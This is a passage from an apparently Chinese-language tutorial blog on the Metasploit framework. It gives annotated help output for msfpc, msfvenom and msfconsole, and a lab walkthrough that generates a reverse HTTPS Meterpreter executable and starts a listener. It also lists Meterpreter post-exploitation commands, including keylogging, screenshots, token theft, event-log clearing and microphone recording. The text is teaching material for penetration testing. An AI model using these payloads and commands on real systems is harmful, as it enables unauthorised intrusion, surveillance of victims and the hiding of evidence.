#停止并删除数据库</span><br><span class="line">  msfdb start   #启动数据库</span><br><span class="line">  msfdb stop    # 停止数据库</span><br></pre></td></tr></table></figure><h3 id="msfpc"><a href="#msfpc" class="headerlink" title="msfpc"></a>msfpc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfpc</span><br><span class="line">#用来生成payload的</span><br><span class="line"> </span><br><span class="line"> /usr/bin/msfpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;)</span><br><span class="line">例如: /usr/bin/msfpc windows 192.168.1.10        # Windows &amp; manual IP.</span><br><span class="line">            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0&apos;s IP &amp; manual port.</span><br><span class="line">            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.</span><br><span class="line">            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1&apos;s IP.</span><br><span class="line">            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.</span><br><span class="line">            /usr/bin/msfpc help verbose                # Help screen, with even more information.</span><br><span class="line"> </span><br><span class="line"> &lt;TYPE&gt;:</span><br><span class="line">   + ASP</span><br><span class="line">   + ASPX</span><br><span class="line">   + Bash [.sh]</span><br><span class="line">   + Java [.jsp]</span><br><span class="line">   + Linux [.elf]</span><br><span class="line">   + OSX [.macho]</span><br><span class="line">   + Perl [.pl]</span><br><span class="line">   + PHP</span><br><span class="line">   + Powershell [.ps1]</span><br><span class="line">   + Python [.py]</span><br><span class="line">   + Tomcat [.war]</span><br><span class="line">   + Windows [.exe // .dll]</span><br><span class="line"> </span><br><span class="line">&lt;DOMAIN/IP&gt;可使用网卡和MAC地址来探测ip，若不填写将会在生成过程中显示列表来选择</span><br><span class="line">&lt;PORT&gt; 默认443端口</span><br><span class="line">&lt;CMD&gt;使用本地shell</span><br><span class="line">&lt;MSF&gt; 使用meterpreter（默认使用它）</span><br><span class="line">&lt;BIND&gt; 绑定型shell</span><br><span class="line">&lt;REVERSE&gt; 反弹型shell（默认使用它）</span><br><span class="line">&lt;STAGED&gt; 将shellcode分片，需要依赖msf（默认使用它）</span><br><span class="line">&lt;STAGELESS&gt; 不分片</span><br><span class="line">&lt;TCP&gt; 使用TCP协议明文传输，适应性好，容易被IDS等发现（默认使用它）</span><br><span class="line">&lt;HTTP&gt; 使用HTTP协议明文传输，适用于限制80端口传输使用</span><br><span class="line">&lt;HTTPS&gt; 使用HTTPS加密传输，适用于限制在443端口传输，不易被IDS等发现</span><br><span class="line">&lt;FIND_PORT&gt; 将尝试所有端口来突破防火墙</span><br><span class="line">&lt;BATCH&gt;生成每一种组合</span><br><span class="line">&lt;LOOP&gt; 生成每一种类型的</span><br><span class="line">&lt;VERBOSE&gt;显示更加详细的信息</span><br></pre></td></tr></table></figure><p>运行命令后，他将生成payload和相应的监听资源文件，使用msfconsole –r ****.rc进行监听，等待目标上钩<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1333245325_1571990603251/0" class="lozad"><br>例如这里，他显示用了什么命令，生成的payload位置，怎么进行监听，怎么快速发布payload。</p><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom</span><br><span class="line">#Msf的独立payload生成器，用来替代msfpayload and msfencode.（这出现在以前的书里。。。）</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line"> </span><br><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    指定payload，使用-来使用标准输入从而使用自定义的payload</span><br><span class="line">        --payload-options            列出指定payload的设直项</span><br><span class="line">    -l, --list          [type]                       列出可使用的模块，可使用payloads, encoders, nops, 筛选</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     设置空指令滑行长度</span><br><span class="line">    -f, --format        &lt;format&gt;     指定输出格式</span><br><span class="line">        --help-formats               列出支持的格式</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    指定编码器</span><br><span class="line">    -a, --arch          &lt;arch&gt;       指定架构</span><br><span class="line">        --platform      &lt;platform&gt;   指定平台</span><br><span class="line">        --help-platforms             列出支持的平台</span><br><span class="line">    -s, --space         &lt;length&gt;     现在payload的最大尺寸</span><br><span class="line">        --encoder-space &lt;length&gt;     最大编码尺寸</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       指定要编码的坏字符，例如：&apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      编码次数</span><br><span class="line">    -c, --add-code      &lt;path&gt;       指定包含一个额外的win32shellcode文件</span><br><span class="line">    -x, --template      &lt;path&gt;       指定一个可执行文件作为模板</span><br><span class="line">    -k, --keep                       保持原模板软件有效性</span><br><span class="line">    -o, --out           &lt;path&gt;       指定输出位置</span><br><span class="line">    -v, --var-name      &lt;name&gt;      指定一个自定义的变量名去使用特定输出格式</span><br><span class="line">        --smallest                   生成尽可能小的payload</span><br></pre></td></tr></table></figure><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole -h</span><br><span class="line">Usage: msfconsole [options]</span><br><span class="line">Common options</span><br><span class="line">    -E, --environment ENVIRONMENT    The Rails environment. Will use RAIL_ENV environment variable if that is set.  Defaults to production if neither option not RAILS_ENV environment variable is set.</span><br><span class="line">Database options</span><br><span class="line">    -M, --migration-path DIRECTORY   指定一个额外的包含migration DB的目录</span><br><span class="line">    -n, --no-database                不适用数据库</span><br><span class="line">    -y, --yaml PATH                  指定包含数据库设置的yaml文件地址</span><br><span class="line">Framework options</span><br><span class="line">    -c FILE                          载入指定的配置文件</span><br><span class="line">Module options</span><br><span class="line">        --defer-module-loads         延期载入模块</span><br><span class="line">    -m, --module-path DIRECTORY      添加一个额外的模块路径</span><br><span class="line">Console options:</span><br><span class="line">    -a, --ask                        退出之前先询问</span><br><span class="line">    -L, --real-readline              使用系统的readline而非rb的</span><br><span class="line">    -o, --output FILE                输出到指定文件</span><br><span class="line">    -p, --plugin PLUGIN              启动时即载入插件</span><br><span class="line">    -q, --quiet                      安静启动</span><br><span class="line">    -r, --resource FILE              使用资源文件，可用-表示标准输入</span><br><span class="line">    -x, --execute-command COMMAND    相当于以前的msfcli，后面执行一些命令，用;分隔</span><br><span class="line">msf &gt; ?</span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             显示帮助</span><br><span class="line">    advanced      后接模块，显示高级配置信息</span><br><span class="line">    back          返回上层</span><br><span class="line">    cd            改变当前工作目录</span><br><span class="line">    connect       相当于nc</span><br><span class="line">Usage: connect [options] &lt;host&gt; &lt;port&gt;</span><br><span class="line">-C        对EOL sequence尝试使用回车换行.</span><br><span class="line">-P &lt;opt&gt;  指定源端口</span><br><span class="line">-S &lt;opt&gt;  指定源地址</span><br><span class="line">-i &lt;opt&gt;  指定发送一个文件的内容。</span><br><span class="line">-s        使用ssl连接</span><br><span class="line">-u        切换成UDP的socket</span><br><span class="line">-w &lt;opt&gt;  指定连接超时</span><br><span class="line">-z        只去连接一下就返回</span><br><span class="line">    edit          编辑当前使用的模块</span><br><span class="line">    exit          退出</span><br><span class="line">    get           获取指定局部变量的值</span><br><span class="line">    getg          获取指定全局变量的值</span><br><span class="line">    grep          grep命令</span><br><span class="line">    info          显示指定模块的信息</span><br><span class="line">    irb           进入irb模式（可用来编写irb脚本并执行）可以跟-e接脚本直接执行</span><br><span class="line">    jobs          显示，管理job（在任务较多时可以再使用参数）</span><br><span class="line">    kill          杀死一个job</span><br><span class="line">    load          载入指定插件（载如插件后又是一mol功能，以后再说。。。）</span><br><span class="line">    loadpath      载如一个指定位置的插件</span><br><span class="line">    makerc        将本次进入控制台后使用的命令全部保存为资源文件（就相当于批处理文件）</span><br><span class="line">    options       显示指定端口的一般设置项信息</span><br><span class="line">    reload_all    重载所有模块</span><br><span class="line">    rename_job    重命名一个jobs</span><br><span class="line">    resource      运行一个资源文件</span><br><span class="line">    route         使用指定session来路由，实现内网渗透等</span><br><span class="line">route [add/remove/get/flush/print] subnet netmask [comm/sid]</span><br><span class="line">    search        搜索模块</span><br><span class="line">Usage: search [keywords]</span><br><span class="line">Keywords:</span><br><span class="line">  app       :  匹配客户端还是服务端攻击</span><br><span class="line">  author    :  匹配作者</span><br><span class="line">  bid       :  匹配Bugtraq ID</span><br><span class="line">  cve       :  匹配CVE ID</span><br><span class="line">  edb       :  匹配Exploit-DB ID</span><br><span class="line">  name      :  匹配描述name</span><br><span class="line">  osvdb     :  匹配OSVDB ID</span><br><span class="line">  platform  :  匹配平台（Windows，Linux，Android等）</span><br><span class="line">  ref       :  匹配ref</span><br><span class="line">  type      :  匹配指定类型模块(exploit, auxiliary, or post)</span><br><span class="line">例如:</span><br><span class="line">  search cve:2009 type:exploit app:client</span><br><span class="line">    sessions      管理session的</span><br><span class="line">Usage: sessions [options]</span><br><span class="line">OPTIONS:</span><br><span class="line">-K        终止所有sessions</span><br><span class="line">-c &lt;opt&gt;  与-i配合，对指定session运行指定命令（不使用-i将会对所有生效）</span><br><span class="line">-i &lt;opt&gt;  交互式方式进入session</span><br><span class="line">-k &lt;opt&gt;  终止会话</span><br><span class="line">-l        列出所有sessions</span><br><span class="line">-q        安静模式</span><br><span class="line">-r        与-i配合，对指定session重置环形缓冲区（不使用-i将会对所有生效）</span><br><span class="line">-s &lt;opt&gt;  和-i配合，对指定session运行指定脚本（不使用-i将会对所有生效）</span><br><span class="line">-t &lt;opt&gt;  设置响应超时</span><br><span class="line">-u &lt;opt&gt;  将shell升级为meterpreter</span><br><span class="line">-v        列出详细的</span><br><span class="line">-x        显示扩展的信息</span><br><span class="line">    set           设置局部变量的值</span><br><span class="line">    setg          设置全局变量的值</span><br><span class="line">    show          显示被指定的类型或是所有</span><br><span class="line">[*] 可以使用类型过滤：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options</span><br><span class="line">[*] 在模块中可以这样用: missing, advanced, evasion, targets, actions</span><br><span class="line">    sleep         在数秒内不做任何事</span><br><span class="line">    spool         将以后的输出同时写入指定文件便于查看</span><br><span class="line">    threads       查看当前工作的线程</span><br><span class="line">    unload        卸载指定插件</span><br><span class="line">    unset         去除局部变量的赋值</span><br><span class="line">    unsetg        去除指定全局变量的赋值</span><br><span class="line">    use           使用指定的模块</span><br><span class="line">数据库命令</span><br><span class="line">=========================</span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             列出所有creds信息</span><br><span class="line">    db_connect        连接一个存在的数据库</span><br><span class="line">    db_disconnect     断开数据库连接</span><br><span class="line">    db_export         导出文件</span><br><span class="line">    db_import         倒入一个扫描结果文件（会自动探测类型）直接使用命令可以看到支持的类型</span><br><span class="line">    db_nmap           和nmap一样，只是这个直接将结果写入数据库</span><br><span class="line">    db_rebuild_cache  重建数据库缓存</span><br><span class="line">    db_status         显示当前数据库连接状态</span><br><span class="line">    hosts             列出主机</span><br><span class="line">    loot              列出所有信息（这些命令都可以使用参数来自定义。。。。）</span><br><span class="line">    notes             列出所有的主机</span><br><span class="line">    services          列出所有的服务</span><br><span class="line">    vulns             列出所有的漏洞</span><br><span class="line">    workspace         管理工作空间的</span><br><span class="line">workspace                  列出工作空间</span><br><span class="line">workspace [name]           切换到指定工作空间</span><br><span class="line">workspace -a [name] ...    添加</span><br><span class="line">workspace -d [name] ...    删除</span><br><span class="line">workspace -D               删除所有</span><br><span class="line">workspace -r &lt;old&gt; &lt;new&gt;   重命名</span><br></pre></td></tr></table></figure><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><hr><p>高级,动态,可扩展的payload，它要远强于系统自带shell，在后渗透测试阶段提供一站式操作界面，所以能够使用meterpreter尽量使用它。<br>它的特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">完全基于内存的dll注入式payload（不写入硬盘，当然也可以写入硬盘实现持续控制）</span><br><span class="line">注入合法系统进程并建立stager（传输器）</span><br><span class="line">基于stager上传和预加载dll进行扩展模块注入（客户端API）</span><br><span class="line">基于stager建立的socket链接建立加密的TLS/1.0通信隧道</span><br><span class="line">利用TLS隧道进一步加载后续扩展模块（避免网络取证）</span><br><span class="line">服务端（攻击者端）使用C语言编写</span><br><span class="line">客户端（受害者端）提供基于ruby的全特性API（支持任何语言，只是其他语言不一定是全功能）</span><br></pre></td></tr></table></figure><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>之所以插播此部分，因为可能因为各种原因导致主动利用不成功而无法继续meterpreter实验。先生成payload手动在靶机上运行就可以不必太依赖其他知识，生成方法可以使用msfvenom或是免杀里面介绍的其他内容，也可以使用msfconsole:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use payload/windows/meterpreter/reverse_https</span><br><span class="line">msf payload(reverse_https) &gt; show options </span><br><span class="line">Module options (payload/windows/meterpreter/reverse_https):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     8443             yes       The local listener port</span><br><span class="line">   LURI                       no        The HTTP Path</span><br><span class="line">msf payload(reverse_https) &gt; set LHOST 192.168.79.130</span><br><span class="line">LHOST =&gt; 192.168.79.130</span><br><span class="line">msf payload(reverse_https) &gt; generate -h</span><br><span class="line">Usage: generate [options]</span><br><span class="line">Generates a payload.</span><br><span class="line">OPTIONS:</span><br><span class="line">    -E        强制编码</span><br><span class="line">    -b &lt;opt&gt;  排除坏字符，例如: &apos;\x00\xff&apos;</span><br><span class="line">    -e &lt;opt&gt;  指定编码器</span><br><span class="line">    -f &lt;opt&gt;  指定输出文件，否则输出到屏幕</span><br><span class="line">    -i &lt;opt&gt;  编码几次</span><br><span class="line">    -k        保留模板功能</span><br><span class="line">    -o &lt;opt&gt;  用逗号分隔形式指定参数</span><br><span class="line">    -p &lt;opt&gt;  输出平台</span><br><span class="line">    -s &lt;opt&gt;  Nop滑行长度</span><br><span class="line">    -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war</span><br><span class="line">-x &lt;opt&gt;  指定模板</span><br></pre></td></tr></table></figure><p>此处，排除坏字符是使用编码器将坏字符编码而不是直接舍弃，它是智能选择，在排除坏字符功能实现的前提下使用最优秀的编码器，若坏字符太多可能就不能找到编码器编码咯！这里示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_https) &gt; generate -b &apos;\x00\xff&apos; -s 20 -t exe -p x86 -f hia.exe</span><br></pre></td></tr></table></figure><p>启动监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_https) &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; show options </span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows/meterpreter/reverse_https):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     8443             yes       The local listener port</span><br><span class="line">   LURI                       no        The HTTP Path</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">msf exploit(handler) &gt; set LHOST 0.0.0.0</span><br><span class="line">LHOST =&gt; 0.0.0.0</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line">[*] Started HTTPS reverse handler on https://0.0.0.0:8443</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><h3 id="使用meterpreter"><a href="#使用meterpreter" class="headerlink" title="使用meterpreter"></a>使用meterpreter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">meterpreter核心命令</span><br><span class="line">=============</span><br><span class="line">? / help                  显示帮助菜单 </span><br><span class="line">background               将此会话放进后台（回话依然存在，这样可以使用其他模块利用此session来做更多事）</span><br><span class="line">bgkill                    杀死一个后台会话</span><br><span class="line">bglist                    显示后台运行的脚本</span><br><span class="line">bgrun                     运行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                   显示频道里信息或者控制频道</span><br><span class="line">close                     关闭频道</span><br><span class="line">exit / quit               终止meterpreter会话</span><br><span class="line">get_timeouts              得到当前回话的超时值</span><br><span class="line">info                      显示关于选定模块的信息</span><br><span class="line">irb                       进入rb脚本模式</span><br><span class="line">load                      载入一个或多个meterpreter扩展</span><br><span class="line">machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">migrate                   迁移攻击载荷到指定的pid或者进程名(默认pid，-N name进程名)</span><br><span class="line">read / write              从一个频道读取/写入数据</span><br><span class="line">resource                  运行一个资源文件（类似批处理脚本）</span><br><span class="line">run                       运行一个meterpreter脚本或模块</span><br><span class="line">set_timeouts              设置当前模块连接超时值</span><br><span class="line">sleep                     强制meterpreter去什么都不做再重新连接</span><br><span class="line">transport                 改变当前传输机制（后续发）</span><br><span class="line">use                       改变load的别名</span><br><span class="line">uuid                      获取当前的uuid</span><br><span class="line">文件命令(和Linux几乎一致)</span><br><span class="line">============================</span><br><span class="line">cat           把一个文件内容输出到屏幕（查看文件内容）</span><br><span class="line">cd            移动到其他目录</span><br><span class="line">download      下载一个文件或目录</span><br><span class="line">Usage: download [options] src1 src2 src3 ... destination</span><br><span class="line">OPTIONS:</span><br><span class="line">-r        递归下载所有内容</span><br><span class="line">-t        时间戳也要下载</span><br><span class="line">edit          编辑一个文件（和vim操作类似）</span><br><span class="line">lpwd           查看本地目录</span><br><span class="line">getwd         查看远程目录</span><br><span class="line">lcd           改变本地工作目录</span><br><span class="line">ls            列出文件</span><br><span class="line">mkdir         创建目录</span><br><span class="line">mv            移动</span><br><span class="line">pwd           显示当前工作目录</span><br><span class="line">rm            删除</span><br><span class="line">rmdir         删除目录</span><br><span class="line">search        搜素</span><br><span class="line">show_mount    列出所有设备（磁盘）</span><br><span class="line">upload        上传文件或目录（-r 地柜上传）</span><br><span class="line">网络命令</span><br><span class="line">===========================</span><br><span class="line">arp          显示ARP缓存表</span><br><span class="line">getproxy      显示代理设置</span><br><span class="line">ifconfig      显示网卡设置</span><br><span class="line">ipconfig      显示网卡设置</span><br><span class="line">netstat       显示网络连接状态</span><br><span class="line">portfwd       指向一个本地端口到远程服务（端口转发，后续会发）</span><br><span class="line">route         显示(修改)受害主机路由表</span><br><span class="line">Supported commands:</span><br><span class="line">   add    [subnet] [netmask] [gateway]</span><br><span class="line">   delete [subnet] [netmask] [gateway]</span><br><span class="line">   list</span><br><span class="line">系统命令</span><br><span class="line">=======================</span><br><span class="line">clearev        清除事件日志（系统自带的日志）</span><br><span class="line">drop_token    放弃所有的假冒令牌</span><br><span class="line">execute       执行一条命令（后续发）</span><br><span class="line">getenv        取得指定的一个或多环境变量的值</span><br><span class="line">getpid        得到当前进程的pid（攻击shell的pid）</span><br><span class="line">getprivs      尝试获取所有特权      </span><br><span class="line">getsid        Get the SID of the user that the server is running as</span><br><span class="line">getuid        显示当前的身份</span><br><span class="line">kill          杀死一个进程，后接pid，参数-s杀死相关的进程</span><br><span class="line">ps            列出目标主机的进程</span><br><span class="line">reboot        重启目标主机</span><br><span class="line">shutdown      关闭目标主机</span><br><span class="line">reg          修改注册表，可查看帮助（后续发）</span><br><span class="line">rev2self      回到目标主机的初始用户账户下（例如开始是admin后来提权为system，可以回到admin）</span><br><span class="line">shell         使用Windows系统命令行</span><br><span class="line">steal_token   尝试盗取一个令牌</span><br><span class="line">suspend      暂停或恢复一个列表进程</span><br><span class="line">sysinfo       取得目标主机的系统信息，含电脑名，操作系统，架构，语言，工作组，登录用户数</span><br><span class="line">用户界面命令</span><br><span class="line">===============================</span><br><span class="line">enumdesktops   列举出目标主机上所有的桌面</span><br><span class="line">idletime       返回目标主机已经被闲置了多少时间</span><br><span class="line">keyscan_dump   得到键盘录制的内容</span><br><span class="line">keyscan_start  开始键盘录制</span><br><span class="line">keyscan_stop   停止键盘录制</span><br><span class="line">screenshot     抓取屏幕截图</span><br><span class="line">setdesktop     切换到其他用户界面【当有多个用户登录时】</span><br><span class="line">uictl          控制用户的键盘，鼠标</span><br><span class="line">网络摄像头命令</span><br><span class="line">=======================</span><br><span class="line">record_mic     从默认的录入设备记录x秒的音频</span><br><span class="line">OPTIONS:</span><br><span class="line">    -d &lt;opt&gt;  记录几秒，默认1s</span><br><span class="line">    -f &lt;opt&gt;  保存路径，默认：&apos;/root/[randomname].wav&apos;</span><br><span 